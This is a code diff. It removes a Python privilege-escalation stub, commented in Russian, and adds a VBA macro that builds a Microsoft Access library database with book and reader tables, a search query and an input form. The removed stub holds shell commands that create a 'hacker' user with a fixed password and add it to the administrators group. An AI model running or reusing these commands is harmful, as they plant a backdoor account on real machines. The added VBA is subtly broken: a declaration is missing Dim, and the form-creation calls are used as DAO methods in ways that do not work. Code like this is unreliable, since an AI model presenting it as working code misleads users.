@@ -1,27 +1,163 @@
-import os
-import sys
-import ctypes
-
-# Проверка на административные привилегии
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-# Попытка повышения привилегий через уязвимость
-def exploit_vulnerability():
-    # Здесь должен быть код для эксплуатации уязвимости
-    # Например, использование уязвимости в службе или драйвере
-    print("[+] Exploiting vulnerability...")
-    # Пример: Запуск команды от имени SYSTEM
-    os.system("net user hacker P@ssw0rd /add")
-    os.system("net localgroup administrators hacker /add")
-
-if __name__ == "__main__":
-    if is_admin():
-        print("[+] Already running with administrative privileges!")
-    else:
-        print("[!] Not running with administrative privileges.")
-        print("[+] Trying to exploit vulnerability...")
-        exploit_vulnerability()
+Sub CreateLibraryDatabase()
+    Dim db As DAO.Database
+    Dim tblBooks As DAO.TableDef
+    tblReaders As DAO.TableDef
+    Dim fld As DAO.Field
+    Dim idx As DAO.Index
+    Dim qdf As DAO.QueryDef
+    Dim strSQL As String
+    
+    ' Создаем новую базу данных
+    Set db = DBEngine.CreateDatabase("C:\LibraryDatabase.accdb", dbLangGeneral)
+    
+    ' 1. Создаем таблицу "Книги"
+    Set tblBooks = db.CreateTableDef("Книги")
+    
+    ' Добавляем поля в таблицу "Книги"
+    With tblBooks
+        ' Код книги (первичный ключ)
+        Set fld = .CreateField("КодКниги", dbLong)
+        fld.Attributes = dbAutoIncrField
+        .Fields.Append fld
+        
+        ' Название книги
+        Set fld = .CreateField("Название", dbText, 100)
+        fld.Required = True
+        .Fields.Append fld
+        
+        ' Автор
+        Set fld = .CreateField("Автор", dbText, 50)
+        .Fields.Append fld
+        
+        ' Год издания
+        Set fld = .CreateField("ГодИздания", dbInteger)
+        .Fields.Append fld
+        
+        ' Жанр
+        Set fld = .CreateField("Жанр", dbText, 30)
+        .Fields.Append fld
+        
+        ' Доступность (есть ли книга в наличии)
+        Set fld = .CreateField("Доступна", dbBoolean)
+        fld.DefaultValue = True
+        .Fields.Append fld
+    End With
+    
+    ' Создаем первичный ключ
+    Set idx = tblBooks.CreateIndex("PrimaryKey")
+    idx.Primary = True
+    idx.Unique = True
+    Set fld = idx.CreateField("КодКниги")
+    idx.Fields.Append fld
+    tblBooks.Indexes.Append idx
+    
+    ' Добавляем таблицу в базу данных
+    db.TableDefs.Append tblBooks
+    
+    ' 2. Создаем таблицу "Читатели"
+    Set tblReaders = db.CreateTableDef("Читатели")
+    
+    ' Добавляем поля в таблицу "Читатели"
+    With tblReaders
+        ' Код читателя (первичный ключ)
+        Set fld = .CreateField("КодЧитателя", dbLong)
+        fld.Attributes = dbAutoIncrField
+        .Fields.Append fld
+        
+        ' ФИО читателя
+        Set fld = .CreateField("ФИО", dbText, 100)
+        fld.Required = True
+        .Fields.Append fld
+        
+        ' Адрес
+        Set fld = .CreateField("Адрес", dbText, 200)
+        .Fields.Append fld
+        
+        ' Телефон
+        Set fld = .CreateField("Телефон", dbText, 20)
+        .Fields.Append fld
+        
+        ' Email
+        Set fld = .CreateField("Email", dbText, 50)
+        .Fields.Append fld
+    End With
+    
+    ' Создаем первичный ключ для таблицы "Читатели"
+    Set idx = tblReaders.CreateIndex("PrimaryKey")
+    idx.Primary = True
+    idx.Unique = True
+    Set fld = idx.CreateField("КодЧитателя")
+    idx.Fields.Append fld
+    tblReaders.Indexes.Append idx
+    
+    ' Добавляем таблицу в базу данных
+    db.TableDefs.Append tblReaders
+    
+    ' 3. Создаем запрос для поиска книг по автору
+    strSQL = "PARAMETERS [ИмяАвтора] Text ( 255 ); " & _
+             "SELECT Книги.Название, Книги.Автор, Книги.ГодИздания, Книги.Жанр " & _
+             "FROM Книги " & _
+             "WHERE Книги.Автор Like [ИмяАвтора] & '*' " & _
+             "ORDER BY Книги.Название;"
+    
+    Set qdf = db.CreateQueryDef("ПоискКнигПоАвтору", strSQL)
+    
+    ' 4. Создаем простую форму для ввода данных о книгах
+    ' (Создание формы через VBA требует больше кода, поэтому здесь упрощенный вариант)
+    Dim frm As Object
+    Dim ctl As Object
+    
+    ' Создаем новую форму
+    Set frm = db.CreateForm
+    frm.Name = "frmВводКниг"
+    frm.Caption = "Ввод данных о книгах"
+    
+    ' Добавляем элементы управления на форму
+    ' Поле Название
+    Set ctl = db.CreateControl(frm.Name, acTextBox, acDetail)
+    ctl.Name = "txtНазвание"
+    ctl.ControlSource = "Название"
+    ctl.Left = 100
+    ctl.Top = 100
+    ctl.Width = 3000
+    frm.Controls.Append ctl
+    
+    ' Метка для поля Название
+    Set ctl = db.CreateControl(frm.Name, acLabel, acDetail)
+    ctl.Name = "lblНазвание"
+    ctl.Caption = "Название книги:"
+    ctl.Left = 100
+    ctl.Top = 75
+    frm.Controls.Append ctl
+    
+    ' Поле Автор
+    Set ctl = db.CreateControl(frm.Name, acTextBox, acDetail)
+    ctl.Name = "txtАвтор"
+    ctl.ControlSource = "Автор"
+    ctl.Left = 100
+    ctl.Top = 200
+    ctl.Width = 3000
+    frm.Controls.Append ctl
+    
+    ' Метка для поля Автор
+    Set ctl = db.CreateControl(frm.Name, acLabel, acDetail)
+    ctl.Name = "lblАвтор"
+    ctl.Caption = "Автор:"
+    ctl.Left = 100
+    ctl.Top = 175
+    frm.Controls.Append ctl
+    
+    ' Добавляем форму в базу данных
+    db.Containers("Forms").Documents.Add frm.Name
+    
+    ' Сообщение об успешном создании базы данных
+    MsgBox "База данных 'Библиотека' успешно создана!" & vbCrLf & _
+           "Расположение: C:\LibraryDatabase.accdb", vbInformation
+    
+    ' Очищаем объекты
+    Set frm = Nothing
+    Set qdf = Nothing
+    Set tblReaders = Nothing
+    Set tblBooks = Nothing
+    Set db = Nothing
+End Sub
